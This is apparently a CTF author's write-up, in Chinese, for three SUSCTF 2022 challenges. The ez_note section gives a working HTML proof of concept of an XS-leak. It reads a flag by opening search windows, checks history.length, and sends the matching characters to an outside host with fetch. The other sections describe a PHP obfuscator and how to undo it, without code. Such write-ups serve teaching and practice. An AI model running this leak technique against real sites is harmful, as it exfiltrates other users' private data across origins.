# checkin & ez\_note & rubbish maker wp

## checkin
请仔细阅读题目描述，bot只在对应的频道会有响应，PM的意思是私聊，私聊bot发送`>flag`即可获取flag
flag会在出现的短时间内被修改，录屏截图都行

## ez\_note

### tl;dr
xs leak window.history

### solution
首先要明确的一点是这个题不是XSS而是XS leak。为了增加迷惑性，我在反馈界面中让用户输入的是path而不是完整的url，在CSP中加入了`unsafe-inline`（实际上这个CSP是给跳转的js用的，但是我就是不用nonce），但实际上所有的输出点都使用的是ejs escape过的输出，并不存在XSS。以及每个用户只能看见自己的note，在创建note时有一定的说明，也可通过创建两个账号的方式来验证这一点。以及我在描述中明确了flag的格式，也是一种提示(大概)

附件中给出了bot访问url的逻辑，使用了node的URL类，我将base设置为了题目的站点，而用户输入则是path，但实际上，只要简单的阅读URL类的文档，就会发现在输入的path是一个绝对url的时候会直接忽略后面的base，如下所示

```javascript
let myURL = new URL('http://Example.com/', 'https://example.org/');
// http://example.com/

myURL = new URL('https://Example.com/', 'https://example.org/');
// https://example.com/

myURL = new URL('foo://Example.com/', 'https://example.org/');
// foo://Example.com/
```

至此即可让bot访问任意链接，网站中的搜索功能在只有唯一匹配的时候会进行一个重定向（并且搜索是非常常见的xs leak形式。。。），利用该重定向进行攻击

因为samesite属性是lax，且X-Frame-Option设定了same origin，所以只能靠开window的方式绕过上述两个限制，利用window.history属性完成leak。
最后将window调回自己的域就能跨过同源策略，判断history.length即可知道有无发生重定向

搜索功能那里webStorm给我联想了个search我就直接用了，没反应过来这个玩意支持正则，然后比赛时被redos打爆了。。。后来改成了indexOf

用的recaptcha导致好像师傅们做验证码做的有点痛苦。。。虽然已经调到用户最友好了，但是还是有师傅反馈基本百分百触发验证码。。。我个人测试的时候是没有这回事的，为此感到抱歉。。。。可能是比赛的时候访问量大了就严格起来了。

但是我为此调短了flag的长度，大概就做个十来次就能跑出来了呜呜

一个poc
```html
<!DOCTYPE html>
<html lang="en">
<body onload=exp()>
</body>
<script>
    function exp(){
        let charset = "1234567890_qwertyuiopasdfghjklzxcvbnm"
        for(let c of charset){
            test(c)
        }
    }
    function test(c) {
        let win = open("http://123.60.29.171:10001/search?q=SUSCTF{"+ c )

        setTimeout(()=>{win.location="http://ip"}, 2000)
        setTimeout(()=>{
            console.log(c)
            console.log(win.history.length)
            if(win.history.length === 3)
            {
                fetch("http://ip/?" + c)
            }
        }, 4000)
        setTimeout(()=>{
            win.close()
        }, 5000)
    }

</script>
</html>
```

## rubbish maker
这个题是基于 [PHP-Parser](https://github.com/nikic/PHP-Parser) 进行编写的。 可以在[这里](https://github.com/Z3ratu1/my_ctf_challenge/tree/main/SUSCTF2022/rubbish_maker)查看我的题目源码和题解 . 由以下四部分组成: `NameObfuscator`, `ScalarObfuscator`, `ControlFlowFlattener` , `LogicShuffler`.


专门用语法分析写了个混淆器，自我认为和之前那种一万个类找反序列化链还是不一样的，那种问题可以通过一些正则黑魔法之类的东西解决，而我希望的是师傅们能够用语法分析来编写一个反混淆器。为此还加了一些反调试的代码（但是我完全不会反调试，所以反调试的代码都是从网上复制粘贴的，再加了一个控制流平坦化阻止调试，这一切似乎有用）

反混淆主要是两个点，一个是开头那个巨大函数，那个函数收集了实际代码的所有函数调用二元操作等行为，然后后面的所有操作都通过调用这个函数获取。理论上来说，就是用来反调试的。函数的第一句定义了一个常量，之后都是用该常量和参数进行异或来获取返回值。我这里是用AST直接对所有的入口进行了还原，然而我看大部分师傅还是用的正则黑魔法。。。直接把函数用正则匹配出来然后执行获取返回值填回去。确实是一个很棒的思路，但是为什么还是正则黑魔法啊啊啊啊啊。

还原了这个函数之后其实后面的代码就很容易看懂了，唯一要去掉的就是一堆打乱的goto，再这里其实多观察一下就能发现，有很多goto是往回跳的，跳回去之后会发生无限循环。只要发现了往回跳的label是假label之后，基本上就没什么问题了。

剩下还有一些字符串和数字之类的混淆，用手解也能解出来。

就是为什么师傅们还是在用正则黑魔法，呜呜。

以及这里的goto本身我的思考逻辑是往回跳的都是假的goto，这样子混淆解起来会方便很多，switch处的eval本身应该是一个假eval，无法抵达，但是似乎在某些机缘巧合之下会使得往回跳的label能够使其正常得到赋值并进行命令执行，算是一个小小的非预期，不过混淆都解掉了也就无所谓后面的做法了